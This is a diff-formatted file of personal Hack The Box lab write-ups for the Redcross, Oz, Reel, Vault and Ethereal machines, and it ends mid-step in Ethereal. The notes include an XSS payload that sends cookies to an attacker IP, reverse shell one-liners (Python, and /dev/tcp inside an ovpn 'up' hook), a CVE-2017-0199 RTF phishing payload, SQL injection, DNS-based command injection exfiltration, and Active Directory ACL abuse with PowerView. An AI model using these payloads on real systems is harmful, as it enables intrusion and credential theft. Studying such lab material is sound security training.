@@ -1,0 +1,1966 @@
+HTB REDCROSS
+Nmap show us this ports
+80
+443
+22
+ 
+Doing dirb shows us:
+Seems like nothing tried with a bunch of dics dirbuster and dirb nothing so far
+ 
+so we see the host its intra.redcross.htb its a subdomain so we can stark looking for another subdomains i use wfuzz for this task:
+ 
+wfuzz -c -z file,/root/SecLists/Discovery/DNS/subdomains-top1mil-20000.txt -Z --hc XXX -u http://FUZZ.redcross.htb
+ 
+SEEMS not working too
+ 
+Now trying again with dirbuster and medium list with recursive dirs and files and extension php pdf txt and html
+manage to found a interesting pdf.
+ 
+Its says you have to send a requet in the contact forms for credentials
+ 
+Subject: credentials
+main field:
+"username=any""
+email
+ 
+when we send the request a message appears to use guest:guest as login because of times for proccessing the request.
+ 
+Once logged in capturing the request wiht burp shows us a hidden parameter o=query&
+ 
+trying for sqli adding a simple ' we trigger an error.
+ 
+Trying with differents kind of symbols manage to find this %
+when injected we can see all messages from users:
+ 
+admin subd webapp problems (priority) [6]
+From: penelope (uid 2)  To: charles (uid 3)
+ 
+Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR
+ 
+Its another subdomain admin so we add to /etc/host and another login page.
+ 
+Now we can capture burp request save it and try sqlmap -r request
+ 
+And then we can see dbs users etc:
+ 
+ 
+Now trying with xss on contac form we manage to found email field its vulnerable so we can try this
+ 
+Start python http.server on attack
+ 
+Request
+ 
+username=whatever
+ 
+Enter this in the bottom box for email field
+<script>new Image().src="http://10.10.15.84:8000/"+document.cookie;</script>
+ 
+We should get our cookie.
+On admin.redcross.htb
+ 
+pst5us8nd2f537toof73ksrr92
+ 
+Now on firefox we can try edit cookie and put the cookie value on it you should be able to login to the admin panel
+Now next its simple create a user copy the pass and whitelist you ip then login to ssh.
+ 
+And we are in. But this a jail.
+ 
+Now on admin it panel i managed to find when we send a request for deny a ip with burp theres a ip parameter trying to inject commands on it with ; we can get a reverse shell:
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.84",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+And we now have a reverse shell with www-data
+ 
+Another method its when we whitelist our ip we can do nmap again and found this ports open
+ 
+1025 haraka 2.8.8
+5432 postgresql
+   
+Now searching for xploit i found msf one
+use exploit/linux/smtp/haraka
+configuring correctly with correct emails:
+ 
+admin@redcross.htb
+penelope@redcross.htb
+ 
+and set payload to linux/x64/shell_reverse_tcp
+ 
+we manage to get ourselves a shell and now we can cat the user.txt
+ac899bd46f7b014a369fbb60e53329bf
+ 
+Now searching for priv escalatin i managed to find /var/www/html/admin
+ 
+in there is a file containing users and password for the postgresql db:
+ 
+psql -d unix -U unixusrmgr -h localhost -W
+PASSWORD:    aXwrtUO9_aa&
+             dheu%7wjx8B&
+Now searching for the databases with \l
+now we can view there are four tables only have acces to passwd_table we can see their schema with
+\d+ passwd_table
+and show all tables with \dt
+now we can create a user from admin panel and copy password
+now from psql we can edit their properties
+ 
+update passwd_table set gid=0 where gid=yourusergid
+update passwd_table set homedir='/root' where homedir='/var/jail/home''
+ 
+Alternate we can create a user of our own from psql
+as show in actions.php file
+insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
+ 
+ 
+insert into passwd_table (username, passwd, gid, homedir) values (yourvalues)
+ 
+now we can login with ssh and got gid(root) group(root) but uid(not root)
+we have to find a way
+ 
+Now digging through all the posibilities to get root
+ 
+ret2libc, phantom, xss, postgresql, etc
+ 
+i found another one reading on /etc/group file i realize i could add my user to sudo group as i already know my password.
+ 
+So from ssh shell i go again to psql> and run this command to make me sudo group
+ 
+update passwd_table set gid=27(sudo group) where username='myuser''
+ 
+now wait for db to update the values and then log out and in from ssh you should now be sudo group.
+ 
+Now we can try to execute:
+ 
+sudo cat /root/root.txt
+ 
+and we got root flag:
+ 
+892a1f4d018e5d382c4f5ee1b26717a4
+ 
+*****************************************************
+ 
+HTB OZ
+First enumerations on nmap result with intense scan plus upd we found:
+ 
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: 97B3DCB2DFD3428EA06B6A67C1468B3A
+| http-methods:
+|_  Supported Methods: HEAD OPTIONS GET POST
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+|_http-title: OZ webapi
+|_http-trane-info: Problem with XML parsing of /evox/about
+8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: 131B03077D7717DBFF2E41E52F08BC7A
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+| http-title: GBR Support - Login
+|_Requested resource was http://10.10.10.96:8080/login
+|_http-trane-info: Problem with XML parsing of /evox/about
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.121 days (since Tue Nov  6 08:14:20 2018)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+ 
+On port 80 we found please register a Username
+On port 80 we found some login page GBR Support
+ 
+Using dirsearch on both ports is useless since there is a custom 404 page that will return a random string of random length.
+ 
+Trying with curl -i all the reponses where 200 OK
+Also discovering verbs used on the server we found:
+ 
+HEAD, OPTIONS, GET
+ 
+Trying to use POST we get :
+YOU HAVE NO POWER HERE!  .i.
+ 
+Since the server support different HTTP methods we wrote a basic scanner using python requests library: we can abuse the
+OPTIONS method to read the Content-Length header. The webserver will answer with a code 200 and a Content-Length of 0
+for an existing page.
+ 
+So we can create our python script to filter the responses
+ 
+###########################################################
+import requests
+import multiprocessing as mp
+url = "http://10.10.10.96/"
+def check(token):
+    r = requests.options(url + token)
+    if int(r.headers["Content-Length"]) == 0:
+        print("OPTIONS", token)
+    r = requests.post(url + token)
+if __name__ == '__main__':
+    lines = open("/usr/share/dirbuster/directory-list-2.3-medium.txt").read().split("\n")
+    with mp.Pool(processes=100) as p:
+        p.map(check, lines)
+############################################################
+Running we manage to find a dir named /users
+ 
+Now we can modify our script to put this dir on the url field
+But it gives to many false positives since we are using OPTIONS and content NULL;
+so we can change the method to GET
+ 
+So modifying the code a little we get
+ 
+############################################################
+import requests
+import multiprocessing as mp
+url = "http://10.10.10.96/users/"
+def check(token):
+    url = "http://10.10.10.96/"
+    r = requests.options(url + token)
+    if int(r.headers["Content-Length"]) == 0:
+        print("OPTIONS", token, r.text)
+    url = "http://10.10.10.96/users/"
+    r = requests.get(url + token)
+    if r.text.strip()[:4] != "null":
+        print("GET", token, r.text)
+if __name__ == '__main__':
+    lines = open("params.txt").read().split("\n")
+    with mp.Pool(processes=100) as p:
+        p.map(check, lines)
+############################################################
+ 
+Running we managed to get /users/admin :
+ 
+GET                          
+                    <title>OZ webapi</title>
+                    <h3>Please register a username!</h3>                                  
+GET admin {"username":"admin"}
+ 
+So we can now proceed to guess other URI parts or parameters using other HTTP methods.
+ 
+After some fuzzing we hadn’t found anything useful to continue the enumeration phase but we saw that when inserting a ' in
+the URL the server returns a 505 error.
+ 
+http "http://10.10.10.96/users/admin'"
+HTTP/1.0 500 INTERNAL SERVER ERROR
+Content-Length: 291
+Content-Type: text/html
+Date: Mon, 03 Sep 2018 22:17:05 GMT
+Server: Werkzeug/0.14.1 Python/2.7.14
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+ 
+Maybe we can exploit some URI injection using sqlmap.
+ 
+sqlmap -u "http://10.10.10.96/users/admin" --threads 10 --level 5 --risk 3 --batch --dbs
+ 
+Turns out that the target is vulnerable and at the end of the scan we got the list of all MySQL server’s databases.
+ 
+ 
+******************************************************************
+ 
+HTB REEL
+Discovery
+nmap -sV -sC -Pn -p 1-65535 -T5 10.10.10.77
+21/tcp open ftp Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18 12:19AM <DIR> documents
+| ftp-syst:
+|_ SYST: Windows_NT
+22/tcp open ssh OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+| 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp open smtp?
+| fingerprint-strings:
+| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, | 220 Mail Service ready
+| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
+| 220 Mail Service ready
+| sequence of commands
+| sequence of commands
+| Hello:
+| 220 Mail Service ready
+| EHLO Invalid domain address.
+| Help:
+| 220 Mail Service ready
+| DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| SIPOptions:
+| 220 Mail Service ready
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+|_ sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
+1
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+ 
+First we downloaded all the files from the FTP:
+• AppLocker.docx
+• readme.txt
+• Window Event Forwarding
+ 
+The readme states:
+please email me any rtf format procedures - I'll review and convert.
+new format / converted documents will be saved here.
+ 
+So we need to send a malicious rtf document to the machine using the SMTP service on port 25.
+ 
+We first need an email address to send these emails, from the FTP’s files we discovered some email addresses.
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="We found an email address: nico@megabank.com but also LAPTO12.HTB.LOCAL and WEF.HTB.LOCAL in the docx file.
+ 
+From metasploit we found an exploit called exploit/windows/fileformat/office_word_hta created for the CVE-2017-0199
+to craft a malicious RTF file with a meterpreter payload.
+ 
+And with alpine we sent an email to reel@htb.local (or any other address in htb.local domain).
+N.B. on alpine we need to set as our domain: htb.local and as SMTP server the IP 10.10.10.77.
+ 
+But first we have to convert this file we are storing in our local server as RTF FILE for that i found this python script
+ 
+https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py
+Now running this command should give us as output the Invoice2.rtf file that we need to send as attachment in alpine email client.
+python toolkit.py -w Invoice2.rtf -t RTF -M gen -u
+python toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.56.1/logo.doc
+ 
+Once we have sent the email and having our msfconsole module running and listeneing on payload port we should receive a meterpreter session as htb\nico.
+port 3487  
+Now we can read our user flag:
+fa363aebcfa2c29897a69af385fee971
+ 
+PRIVILEGE SCALATION
+ 
+Now for enumeration we have a
+WINDOWS 2012 R2 SERVER
+RUNNING ON X64 BITS
+ 
+In the same folder we found another file called cred.xml which contains a PSCredential object
+##########################################
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+<Obj RefId="0">
+<TN RefId="0">
+<T>System.Management.Automation.PSCredential</T>
+<T>System.Object</T>
+</TN>
+<ToString>System.Management.Automation.PSCredential</ToString>
+<Props>
+<S N="UserName">HTB\Tom</S>
+<SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d79</Props>
+3
+</Obj>
+</Objs>
+##########################################
+Those are the creds for user HTB\Tom encrypted.
+ 
+This object could be manipulated only on the same computer of the owner of the file (HTB\nico). From a powershell
+shell from meterpreter we can get the password for HTB\Tom with this command:
+ $credential = Import-CliXml -Path
+'C:\Users\nico\Desktop\cred.xml';$credential.GetNetworkCredential().Password.
+ 
+First we load the file a Credential as SecureString and then we can access those encrypted information.
+The password for the user tom is: 1ts-mag1c!!!.
+Now we can SSH into the machine with this combination.
+ 
+Tom groups informations (net user tom)
+ 
+Local Group Memberships *Print Operators
+Global Group memberships *Domain Users *SharePoint_Admins
+*MegaBank_Users *DR_Site
+*HelpDesk_Admins *Restrictions
+ 
+Using reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" we found the password for the user
+nico: 4dri@na2017!**. Yes, this is useless for our privesc proces :)
+ 
+In C:\Users\tom\Desktop\AD Audit we have BloodHound folder e note.txt:
+Findings:
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
+Maybe we should re-run Cypher query against other groups we've created.
+BloodHound is a tool to reveal hidden and unintended relationships within an Active Directory environment; the tool require a
+recon phase to read all informations from the AD: this data collection is possible with PowerView (from PowerSploit).
+Luckly in the BloodHound folder there is the BloodHound_Old.ps1 script and to use it we simply Import-Module
+./BloodHound_Old.ps1 and with Invoke-BloodHound we can create the CSV files with all informations.
+To download our files we create a meterpreter session: msfconsole -x "use exploit/multi/script/web_delivery;
+set target PSH; set payload windows/x64/meterpreter/reverse_tcp; set srvhost 10.10.14.169; set LHOST
+10.10.14.169; set LPORT 3487; run".
+Now have all the data for BloodHound (you need to install it on you machine with neo4j).
+From the BloodHound application we can query the DB create with out CSVs to find the shortest path to Domain Admins.
+ 
+From the note, unfortunately, we know that we can’t exploit a shortest path to Domain Admins so we need to run Cypher to
+query the shortest path for others groups.
+With /usr/share/neo4j/bin/cypher-shel we have a command line query interface for the boltDB create within BloodHound
+(or from the Raw Query in BloodHound GUI).
+5
+With Get-ADGroup -filter * -properties GroupCategory | ft name,SamAccountName we got all groups in AD:
+name SamAccountName
+---- --------------
+WinRMRemoteWMIUsers__ WinRMRemoteWMIUsers__
+Administrators Administrators
+Users Users
+Guests Guests
+Print Operators Print Operators
+Backup Operators Backup Operators
+Replicator Replicator
+6
+Remote Desktop Users Remote Desktop Users
+Network Configuration Operators Network Configuration Operators
+Performance Monitor Users Performance Monitor Users
+Performance Log Users Performance Log Users
+Distributed COM Users Distributed COM Users
+IIS_IUSRS IIS_IUSRS
+Cryptographic Operators Cryptographic Operators
+Event Log Readers Event Log Readers
+Certificate Service DCOM Access Certificate Service DCOM Access
+RDS Remote Access Servers RDS Remote Access Servers
+RDS Endpoint Servers RDS Endpoint Servers
+RDS Management Servers RDS Management Servers
+Hyper-V Administrators Hyper-V Administrators
+Access Control Assistance Operators Access Control Assistance Operators
+Remote Management Users Remote Management Users
+Domain Computers Domain Computers
+Domain Controllers Domain Controllers
+Schema Admins Schema Admins
+Enterprise Admins Enterprise Admins
+Cert Publishers Cert Publishers
+Domain Admins Domain Admins
+Domain Users Domain Users
+Domain Guests Domain Guests
+Group Policy Creator Owners Group Policy Creator Owners
+RAS and IAS Servers RAS and IAS Servers
+Server Operators Server Operators
+Account Operators Account Operators
+Pre-Windows 2000 Compatible Access Pre-Windows 2000 Compatible Access
+Incoming Forest Trust Builders Incoming Forest Trust Builders
+Windows Authorization Access Group Windows Authorization Access Group
+Terminal Server License Servers Terminal Server License Servers
+Allowed RODC Password Replication Group Allowed RODC Password Replication Group
+Denied RODC Password Replication Group Denied RODC Password Replication Group
+Read-only Domain Controllers Read-only Domain Controllers
+Enterprise Read-only Domain Controllers Enterprise Read-only Domain Controllers
+Cloneable Domain Controllers Cloneable Domain Controllers
+Protected Users Protected Users
+DnsAdmins DnsAdmins
+DnsUpdateProxy DnsUpdateProxy
+Exchange Install Domain Servers $831000-BCI3MP5FNBO5
+Backup_Admins Backup_Admins
+AppLocker_Test AppLocker_Test
+SharePoint_Admins SharePoint_Admins
+DR_Site DR_Site
+SQL_Admins SQL_Admins
+HelpDesk_Admins HelpDesk_Admins
+Restrictions Restrictions
+All_Staff All_Staff
+MegaBank_Users MegaBank_Users
+Finance_Users Finance_Users
+HR_Team HR_Team
+The syntax for Cypher is not easy but is well documented and full of examples: https://blog.cptjesus.com/posts/introtocypher.
+The query for searching the group nodes that can be returned to only the “DOMAIN ADMINS@HTB.LOCAL” from
+the n nodes finding the shortest path is: MATCH (n:User), (m:Group {name: "DOMAIN ADMINS@INTERNAL.LOCAL"}),
+p=shortestPath((n)-[*1..]->(m)) RETURN p.
+First we need to search all groups that have admin right: MATCH (n:Group) WHERE n.name =~ "(?i).*ADMINS.*" WITH n
+MATCH (n)<-[r:MemberOf*1..]-(m) RETURN n,r,m; with this query we got all admins group and their relationships
+7
+8
+Using this command Import-Module ActiveDirectory;cd ad:;(Get-Acl(Get-ADGroup -Filter 'name -eq "backup_admins"').DistinguishedName).| ft identityreference, accessControlType -AutoSize we can read which rights a group has over the system.
+Since tom is member of SharePoint_Admins and HelpDesk_Admins we can skip this two groups; backup_admins is our target
+group since a backup routine/user should access all data (including our root.txt inside the Administrator folder). From tom
+we can’t add any user to backup_admins so we need to exploit another user.
+We found out that we can use claire to access backup_admins group.
+In order to privesc to claire we check the rights from tom to claire within BloodHound (bruteforcing user all the users).
+9
+We found that tom can set the WriteOwner right over claire: we can reset the user password from tom.
+cd "C:\Users\tom\Desktop\AD Audit\BloodHound"
+$upwd = ConvertTo-SecureString "1ts-mag1c!!!" -AsPlainText -Force;
+Import-Module ./PowerView.ps1
+Set-DomainObjectOwner -identity claire -owneridentity tom
+Add-ObjectACL -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+Set-ADAccountPassword claire -NewPassword $upwd –Reset
+This script will use PowerView to change the default password of claire to the same of tom.
+Now we can SSH as claire.
+But we cannot add claire to backup_admins with Add-ADGroupMember -Identity "backup_admins" -Members claire so
+from tom session we used
+cd "C:\Users\tom\Desktop\AD Audit\BloodHound"
+$upwd = ConvertTo-SecureString "1ts-mag1c!!!" -AsPlainText -Force;
+Import-Module ./PowerView.ps1
+$cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\Claire', $upwd)
+Add-DomainGroupMember -Identity "backup_admins" -Members 'Claire' -Credential $cred
+to add claire to our backup_admins group. Now we can SSH as claire with read permission on the Administrator folder:
+PS C:\> net user claire
+User name claire
+Full Name Claire Danes
+Comment
+User's comment
+Country/region code 000 (System Default)
+Account active Yes
+Account expires Never
+Password last set 7/24/2018 7:59:49 PM
+Password expires Never
+Password changeable 7/25/2018 7:59:49 PM
+Password required Yes
+User may change password Yes
+Workstations allowed All
+Logon script
+User profile
+Home directory
+10
+Last logon 7/24/2018 6:42:19 PM
+Logon hours allowed All
+Local Group Memberships *Hyper-V Administrator
+Global Group memberships *Backup_Admins *Domain Users
+*MegaBank_Users *DR_Site
+*Restrictions
+But we cannot access the root.txt file:
+On the admin desktop folder we found some script used to backup file over the system into a shared folder \\BACKUP03.
+We cannot access that folder but we found at the head of the BackupScript.ps1:
+# admin password
+$password="Cr4ckMeIfYouC4n!"
+Using that password to SSH with administrator we can read the root flag.
+1018a0331e686176ff4577c728eaf32a
+ 
+ 
+*******************************************************
+ 
+HTB VAULT
+1)We begin our nmap scan showing us the following
+ 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
+|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
+|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
+80/tcp open  http    Apache/2.4.18 (Ubuntu)
+| http-methods:
+|_  Supported Methods: OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=11/3%OT=22%CT=1%CU=30830%PV=Y%DS=2%DC=T%G=Y%TM=5BDDF38
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+ 
+Uptime guess: 31.849 days (since Tue Oct  2 17:51:24 2018)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   182.13 ms 10.10.12.1
+2   181.42 ms 10.10.10.109
+ 
+Then performing a upd scan we foun
+ 
+631 udp open|filtered ipp
+989 udp open|filtered ftps-data
+3659 udp open|filtered apple-sasl
+5353 udp open|filtered zeroconf
+ 
+   
+2)Then we go to web page and shows us:
+ 
+We are proud to announce our first client: Sparklays (Sparklays.com still under construction)
+ 
+So maybe if we edit the /etc/hosts file to point to this ip we can get something
+and not its nothing
+3)Running dirb with common.txt we found
+/index.php
+/server-status 403f
+ 
+So we have nothing looking at the site again we know we missed something and its the new site
+so testing we add /sparklays dir now running dirb with -x .php extension we managed to get to sites 200ok
+ 
+/admin.php  ----> this one shows a login page trying to access with default users or pass we cant see any error messages
+/login.php  ----> this one shows acces denied
+ 
+now running dirbuster with small dirlist manage to found
+ 
+sparklays/design dir
+which contains
+/design/uploads
+/design/design.html
+/design/changelogo.php which is a upload app
+ 
+trying to upload a reverse shell i managed to do it changing its extension to php.png but now im not able to locate the file i tried in /design/uploads but it isnt workin.
+ 
+Trought a lot of attemps i manage to get a working shell just by renaming its extension to php5
+ 
+Now we are in doing a little enumeration i found the home dir for Dave and in desktop a file called ssh where are stored the ssh credentials as follows:
+ 
+dave:Dav3therav3123
+ 
+now logged in with ssh in daves directory theres a .root.txt.swp
+which contains :
+b0nano 2.5.daveubunturoot.txtb0nano it seems like a troll
+ 
+Basic enumeration give us nothing but checking command ip a
+show us theres a subnet linked:
+ 
+ip: 192.168.122.1
+It seems like the princess its in a different castle
+ 
+now we have to find a way to upload a nmap socat and netcat
+this can be achieve with a meterpreter session and for that we will use the elf method
+nmap didnt compile also static binary didnt work so i did a perl scan:
+ 
+Showed us this
+ 
+ip 192.168.122.4 its listening port 80 and 22 so we can add a portfwd rule on meterpreter or
+create a tunnel with ssh but first add this line to proxychains in /etc/proxychains.conf:
+127.0.0.1 1080
+ 
+ssh -L 1080:192.168.122.4:80 dave@10.10.10.109
+ 
+now browsing to this page on localhost:6802 shows us 2 link 1 for dns and 1 for vpn config
+on vpn config we have a way to put a ovpn config file and test for connections.
+ 
+Running gobuster on that page i managed to found a dir called /notes which contains:
+ 
+chmod 123.ovpn and script.sh to 777
+ 
+so i tried to go to the file 123.ovpn and got this:
+ 
+remote 192.168.0.1 9004
+dev tun
+nobind
+script-security 2
+up '/bin/bash -c "/bin/bash -i > /dev/tcp/192.168.122.1/9998 0<&1
+2>&1&"'
+ 
+UPDATE THE SCRIPT AND THEN TEST VPN CONNECTION
+ 
+Tried this on vpnconfig.php page copy paste it and started a nc listener on port 9998:
+ 
+got a shell with root privileges going to /home/dave we manage to find the user flag:
+a4947faa8d4e1f80771d34234bd88c73
+ 
+Now reading in /etc/hosts
+i found a new ip address
+192.168.5.2
+Searching on /var/logs/auth.logs i found this
+ 
+if we go to /home/dave we can find a new credential for dave for this ssh server
+dave
+dav3gerous567
+ 
+so we can now ssh to 192.168.122.4 making a ssh tunnel like before to port 22
+ 
+now login and make sudo /bin/bash to have root privs
+now searching for logs we found /var/log/auth.log
+which running command cat auth.log | grep -a 192.168.5.2 shows us that this its running on port 4444 but its like hide.
+ 
+so we have to use ncat to open a port with this command
+ncat -l 5555 --sh-exec "ncat 192.168.5.2 987 --source-port=4444" &
+ 
+now we can check port its open with :
+ 
+/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+ 
+now to connect to his ip we have to do the following since we are opening a port 5555 on localhost to 192.168.5.2 987 with source port 4444:
+ 
+we do ssh dave@localhost -p 5555
+we should get our connection
+ 
+Once we are on Vault we have to scape the rbash with cp command
+so cp /bin/sh /home/dave
+now sh
+we have escaped now we have to decrypt the root.txt.gpg flag
+ 
+but for this we have to this on first machine so we use scp to transfer this to ubuntu machine like this:
+ 
+first on DNS we run this:
+ 
+scp -P 5555 dave@localhost:/home/dave/root.txt.gpg /tmp
+ 
+now on ubuntu machine we transfer like this:
+ 
+scp dave@192.168.122.4:/tmp/root.txt.gpg /dev/shm/
+ 
+now we have the gpg file on ubuntu machine.
+ 
+if we go to the dir containing the file and do :
+ 
+gpg -d root.txt.gpg
+ 
+it will ask us for a passphrase so i pass it since the beggining but searching for it on ubuntu machine i managed to found it in file called key placed on /home/dave/Desktop/key containing the key for gpg file:
+itscominghome
+ 
+Now we can decrypt our root.txt.gpg flag:
+ 
+ca468370b91d1f5906e31093d9bfe819
+ 
+ 
+ 
+*******************************************************
+ 
+HTB ETHEREAL
+1)First its first so we do an nmap scan showing us the following result:
+80 tcp
+8080 tcp
+21 tcp
+ 
+with no udp ports open
+ 
+so ftp its open and we to to test that service out and download everything thats in there using:
+mget *
+ 
+2)Then with gobuster i run it on http://10.10.10.106 which give us this interesting dirs:
+ 
+On port 80:
+ 
+-http://10.10.10.106/
+-http://10.10.10.106/corp/console/admin.aspx
+-http://10.10.10.106/crop/help/assistance.aspx
+ 
+On port 8080:
+i had seen the link to http://ethereal.htb:8080 on the admin page, we add 10.10.10.106 ETHEREAL.HTB to /etc/hosts, and then was able to see a basic auth login page.
+ 
+There was a false user flag  in the admin desktop page.
+ 
+3)So now we now we need some credentials to login onto the webpage on 8080.
+so read throught stuff we found in ftp more carefully:
+ 
+so to check FDISK,DISK1,DISK2, contents we can run:
+mkdir ./mnt && mkdir ./mnt/FDISK && mount -o loop FDISK ./mnt/FDISK
+mkdir ./mnt && mkdir ./mnt/DISK1 && mount -o loop DISK1 ./mnt/DISK1
+mkdir ./mnt && mkdir ./mnt/DISK2 && mount -o loop DISK2 ./mnt/DISK2
+ 
+so in FDISK we manage to found pbox.exe and pbox.dat
+after researching i found pbox.exe its somewhat linked to an old emulator for games and dos programs named "DOSBOX""
+and we can install in our kali wiht apt-get install dosbox
+Now in dosbox we can mount our files like this:
+mount c /path/to/box/files
+running pbox.exe ask for cwsdpmi.zip its some sort or a depency so we download from here:
+https://www.dosgames/com/files/cwsdpmi.zip
+and extract and place on /mnt/FDISK/pbox/
+now we can mount our path and run pbox.exe which ask for a password so we use the most common password:  "password""
+and we are in.
+ 
+4)now some sort of database program show up everytime we select one item it shows us a user and a password so we can make a list out of and crack it trought hydra
+ 
+hydra -L user.txt -P password.txt http-get://ethereal.htb:8080
+ 
+and was able to get basic auth:
+ 
+user:       alan   
+password:   !C414m17y57r1k3s4g41n!
+ 
+we test it in our 8080 port site and we are in with an admin console and a test box that shows test connection.
+so immediately go and test my ip showing and see that connection its successful.
+ 
+Then tried appeding commands after ping command using &&, ||, |
+ 
+Was able to run commands at first with
+ || for /f "tokens" %i in ('whoami') do nslookup %i 10.10.15.110
+without my ip addres which shows me the name 'etherealalan' on wireshark results.
+ 
+If played with the token number was able to see whichever word of a response i selected as the token number.
+e.g. if the response to whoami was "ethereal\alan" the backslash character does not travel through the results we can view, so the token =1, would give me the world etherealalan, whereas if i did the command "echo test 123", token =1 would show test and token=2 would show 123.
+ 
+At this point it was safe to say we were dealing with blind read-only RCE.
+Enumerating this way was an absolute pain and i had to check my other options.
+ 
+Since i knew i couldnt execute anything, i wanted to know why.
+ 
+I checked the firewall rules, using:
+netsh advfirewall firewall show rule name=all
+ 
+this showed port 73 and 136 are open and openssl.exe installed.
+ 
+so we can do this:
+-first we create our key.pem and cert.pem with this command:
+ 
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+ 
+-then we setup our first terminal and launch this command to listen on port 73:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+ 
+-now on a second terminal we run this command to listen for connections port 136:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+ 
+and finally from admin console we launch this command:
+ 
